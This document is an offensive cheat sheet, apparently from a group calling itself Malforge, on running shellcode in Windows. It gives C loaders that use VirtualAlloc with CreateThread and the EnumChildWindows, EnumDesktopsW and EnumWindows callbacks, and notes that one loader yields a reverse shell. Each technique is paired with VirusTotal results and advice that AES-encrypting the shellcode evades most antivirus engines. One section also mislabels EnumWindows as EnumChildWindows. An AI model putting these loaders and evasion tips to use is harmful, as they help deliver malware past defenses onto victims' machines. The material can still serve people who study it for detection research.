# Code Execution via Callbacks CheatSheet

## Introduction

This cheat sheet outlines various techniques to execute shellcode on a Windows machine using callback-based methods. It also highlights which techniques are submitted to VirusTotal.

![image](https://github.com/user-attachments/assets/30de2d79-9ae0-4786-a077-f0c44d4b9a06)

---

## Basic Shellcode Execution

Although not based on callbacks, this is the most straightforward method to execute shellcode.

```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Payload to launch calc.exe
unsigned char my_payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  // truncated for brevity...
};
unsigned int my_payload_len = sizeof(my_payload);

int main(void) {
  void *my_payload_mem;
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;

  my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);
  rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);

  if (rv != 0) {
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) my_payload_mem, 0, 0, 0);
    WaitForSingleObject(th, -1);
  }

  return 0;
}
```

### Proof of Concept
Executing this EXE yields a reverse shell.

![image](https://github.com/user-attachments/assets/f2b7048b-6a62-496a-bc2e-148161405016)

![image](https://github.com/user-attachments/assets/3084cfec-116d-46db-8572-d8db7e7a1bc5)


### Detection
This approach is easily flagged by AV engines.

![image](https://github.com/user-attachments/assets/88a3957a-29f6-45c5-9a92-ccc465d96f33)

---

## EnumChildWindows Execution

The `EnumChildWindows` API is typically used to list child windows of a given parent window. Malware can abuse this to enumerate open applications or inject shellcode.

### Code Sample

```c
#include <windows.h>
#include <stdio.h>

int main() {
    char shellcode[] = "..."; // calc.exe shellcode

    HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(hAlloc, shellcode, sizeof(shellcode));
    EnumChildWindows((HWND) NULL, (WNDENUMPROC) hAlloc, NULL);
}
```

### Proof of Concept
Executing the binary successfully launches the Calculator.

![image](https://github.com/user-attachments/assets/d1d3a5f5-cca9-4585-bc91-56c50480aaa2)


### Detection

![image](https://github.com/user-attachments/assets/530a7e26-dcd8-46ab-b6cf-d058232ed48f)

Using AES-encrypted shellcode dramatically lowers AV detection rates.

![image](https://github.com/user-attachments/assets/f58a8cf6-a074-4ab2-a293-5bddd52db409)

---

## EnumDesktopsW Execution

The `EnumDesktopsW` API enumerates all desktops in the current window station and is sometimes used by attackers to execute shellcode.

### Code Sample

```c
#include <windows.h>
#include <stdio.h>
#include "wingdi.h"

int main() {
    char shellcode[] = "..."; // calc.exe shellcode

    HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(hAlloc, shellcode, sizeof(shellcode));
    EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW) hAlloc, NULL);
    printf("%d", GetLastError());
    VirtualFree(hAlloc, 0, MEM_RELEASE);
}
```

### Proof of Concept
The code successfully spawns Calculator.

![image](https://github.com/user-attachments/assets/299fa077-cd6a-4252-9105-75e6699c5842)

### Detection
Plain MSFVenom shellcode is flagged by 12 AVs; 

![image](https://github.com/user-attachments/assets/c4418c58-9131-4d23-80c8-5691db43f169)

AES-encrypted versions often evade detection.

![image](https://github.com/user-attachments/assets/2e4de228-ab3a-4928-b9b9-ad48f568f6df)

---

## EnumWindows Execution

EnumChildWindows is a Windows API function that is used to enumerate all child windows of a specified parent window. In malware, it can be used to gather information about the environment in which it is running. For example, malware might use EnumChildWindows to enumerate all open windows and their associated process IDs to identify the applications that are running and to detect any security-related applications, such as antivirus software. Additionally, the malware may use the information gathered through EnumChildWindows to carry out malicious actions, such as injecting code into other processes, stealing data, or modifying system settings.

### Code Sample

```c
#include <windows.h>
#include <stdio.h>

int main() {
    char shellcode[] = "..."; // calc.exe shellcode

    HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(hAlloc, shellcode, sizeof(shellcode));
    EnumWindows((WNDENUMPROC) hAlloc, NULL);
}
```

### Proof of Concept
This method also successfully launches Calculator.

![image](https://github.com/user-attachments/assets/3f0e443e-8ca6-49ca-b697-29c06e5e74ae)


### Detection
Standard shellcode triggers alerts from 15 AVs. 

![image](https://github.com/user-attachments/assets/c4d2d8b9-9fbd-485f-8bfc-a2ded8e34641)

AES encryption reduces this to detection by just two engines

![image](https://github.com/user-attachments/assets/78f00b87-9560-4097-adac-84dac1ca288b)

---

## Conclusion

 I hope you found this article useful — stay tuned for more content!
— **Malforge Group**

---
